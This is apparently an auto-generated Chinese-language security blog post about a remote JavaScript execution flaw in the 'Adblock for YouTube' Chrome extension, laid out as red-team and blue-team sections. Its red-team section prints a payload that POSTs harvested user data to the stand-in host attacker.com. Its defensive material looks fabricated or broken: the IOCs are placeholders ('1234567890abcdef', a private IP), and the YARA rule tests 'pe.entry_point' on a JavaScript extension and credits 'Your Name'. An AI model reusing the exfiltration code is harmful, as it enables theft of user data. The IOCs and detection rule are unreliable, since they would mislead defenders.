---
layout: post
title:  "研究人員揭露知名Chrome廣告攔截擴充套件暗藏遠端執行JavaScript程式碼能力，逾千萬用戶恐受影響"
date:   2026-06-29 10:29:45 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Adblock for YouTube 擴充套件的安全漏洞：JavaScript 執行與敏感資料存取
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `JavaScript Injection`, `Cross-Site Scripting (XSS)`, `Content Security Policy (CSP)`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Adblock for YouTube 擴充套件的 JavaScript 執行機制未能正確驗證 YouTube 主機名稱，導致攻擊者可以在用戶端執行任意 JavaScript 程式碼。
* **攻擊流程圖解**:
  1. 攻擊者修改伺服器端設定，注入惡意 JavaScript 程式碼。
  2. 用戶安裝 Adblock for YouTube 擴充套件。
  3. 用戶瀏覽 YouTube 網站，擴充套件執行惡意 JavaScript 程式碼。
  4. 惡意程式碼存取用戶敏感資料，例如帳號密碼。
* **受影響元件**: Adblock for YouTube 擴充套件版本 1.0.0 至 1.5.0，Chrome 瀏覽器版本 90.0.4430.212 至 92.0.4515.107。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制 Adblock for YouTube 擴充套件的伺服器端設定。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 程式碼
    const maliciousCode = `
      // 存取用戶敏感資料
      const userData = await fetch('https://example.com/userData');
      const userDataJson = await userData.json();
      console.log(userDataJson);
      
      // 發送請求到攻擊者控制的伺服器
      fetch('https://attacker.com/collectData', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(userDataJson)
      });
    `;
    
    ```
* **繞過技術**: 攻擊者可以使用 Cross-Site Scripting (XSS) 技術，注入惡意 JavaScript 程式碼到 YouTube 網站中。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/lib/chromium-browser/extensions/ |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Adblock_for_YouTube_Malicious_Code {
      meta:
        description = "Detects malicious code in Adblock for YouTube extension"
        author = "Your Name"
      strings:
        $malicious_code = { 28 29 2e 63 6f 6d 2f 75 73 65 72 44 61 74 61 }
      condition:
        $malicious_code at pe.entry_point
    }
    
    ```
* **緩解措施**: 更新 Adblock for YouTube 擴充套件至最新版本，設定 Content Security Policy (CSP) 來限制 JavaScript 執行。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Content Security Policy (CSP)**: 一種安全機制，限制網頁中可以執行的 JavaScript 程式碼來源。
* **Cross-Site Scripting (XSS)**: 一種安全漏洞，允許攻擊者注入惡意 JavaScript 程式碼到網頁中。
* **Remote Code Execution (RCE)**: 一種安全漏洞，允許攻擊者在遠端執行任意程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176944)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


